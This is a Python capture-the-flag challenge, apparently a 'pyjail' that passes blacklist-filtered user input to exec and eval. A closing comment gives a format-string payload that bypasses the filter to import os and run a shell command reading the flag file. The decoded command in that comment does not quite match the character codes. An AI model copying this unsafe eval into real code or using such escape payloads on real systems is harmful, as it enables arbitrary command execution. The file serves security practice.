#!/usr/bin/python

def breakpoint():
    print("nice one")

def check(attempt):
    filtered = ascii(attempt)
    black_list = "<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abdefghijklmnopqrstuvwxyz{|}~ "
    for i in filtered:
        if i in black_list:
            return False
    return True


print("no chars, no flag")
attempt = input("$ ")
if check(attempt):
    try:
        exec(f'eval({attempt})')
    except:
        print("bla39ila bark")
else:
    print("nope")

# "%c%c%c%c%c%c%c%c%c%c(%c%c%c%c)%c%c%c%c%c%c%c(%c%c%c%c%c%c%c%c%c)"%(95,95,105,109,112,111,114,116,95,95,39,111,115,39,46,115,121,115,116,101,109,39,99,97,116,32,102,108,42,39) --> __import__('os').system('cat flag.txt')